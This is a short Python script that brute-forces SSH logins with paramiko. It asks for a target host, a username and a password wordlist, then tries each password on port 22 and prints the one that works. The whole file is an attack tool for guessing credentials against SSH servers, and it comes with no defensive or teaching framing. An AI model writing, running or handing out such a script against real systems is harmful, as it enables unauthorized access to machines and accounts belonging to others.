#!/usr/bin/env python
import paramiko

host = raw_input('Set host: ')
username = raw_input('Set username: ')
filename = raw_input('Set wordlist: ')

def ssh_connect(host = host, username = username):
	file = open(filename, "r")
	done = False
	p = 'a'
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	while not (p == '' or p == '\n') and not done:
		try:
			p = file.readline()
			p = p[:-1]
			password = p
			ssh.connect(host, 22, username, password)
			print "Connected!"
			print password
			done = True

		except(Exception) as error:
			pass
		finally:
			ssh.close()
			print "Connection closed"

ssh_connect()